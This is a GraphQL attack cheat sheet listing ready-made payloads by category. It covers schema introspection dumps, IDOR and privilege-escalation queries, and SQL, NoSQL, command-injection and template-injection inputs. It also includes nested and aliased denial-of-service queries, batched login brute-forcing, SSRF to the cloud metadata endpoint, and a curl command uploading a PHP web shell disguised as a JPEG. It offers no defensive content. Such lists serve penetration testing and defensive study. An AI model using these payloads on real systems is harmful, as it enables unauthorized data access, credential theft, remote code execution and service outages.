# GraphQL Security — Attack Patterns

## 1. Schema Introspection Abuse
```graphql
# Full schema dump
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}
# Find hidden types
{__type(name:"Admin"){name,fields{name}}}
# Find mutations
{__schema{mutationType{fields{name,args{name,type{name}}}}}}
```

## 2. Authorization Bypass Patterns
```graphql
# Horizontal IDOR
{user(id:2){email,ssn,creditCard}}
# Vertical privilege escalation
{adminUsers{id,email,role}}
# Mutation without auth
mutation{updateUserRole(userId:1,role:"admin"){success}}
```

## 3. Injection via GraphQL
```graphql
# SQL Injection
{user(name:"admin' OR '1'='1"){id,username}}
# NoSQL Injection
{user(filter:"{\"$gt\":\"\"}"){id,username}}
# Command Injection
{ping(host:"127.0.0.1;id"){result}}
# SSTI
{render(template:"{{7*7}}"){output}}
```

## 4. Denial of Service
```graphql
# Deep nesting
{a{b{c{d{e{f{g{h{i{j{field}}}}}}}}}}}
# Alias overloading
{a1:user(id:1){id}a2:user(id:2){id}...a1000:user(id:1000){id}}
# Circular fragments
fragment A on User{...B} fragment B on User{...A}{user{...A}}
```

## 5. Batching Attacks
```graphql
# Rate limit bypass
[
  {"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},
  {"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"}
]
```

## 6. SSRF via GraphQL
```graphql
{fetchUrl(url:"http://169.254.169.254/latest/meta-data/"){content}}
```

## 7. File Upload Exploitation
```bash
curl -X POST http://target/graphql \
  -F 'operations={"query":"mutation($file:Upload!){upload(file:$file){url}}","variables":{"file":null}}' \
  -F 'map={"0":["variables.file"]}' \
  -F '0=@shell.php;type=image/jpeg'
```

## 8. Information Disclosure
```graphql
# Stack traces
{user(id:"invalid"){id}}
# Debug mode
{__type(name:"__Schema"){name,fields{name}}}
# Version info
{version}
```
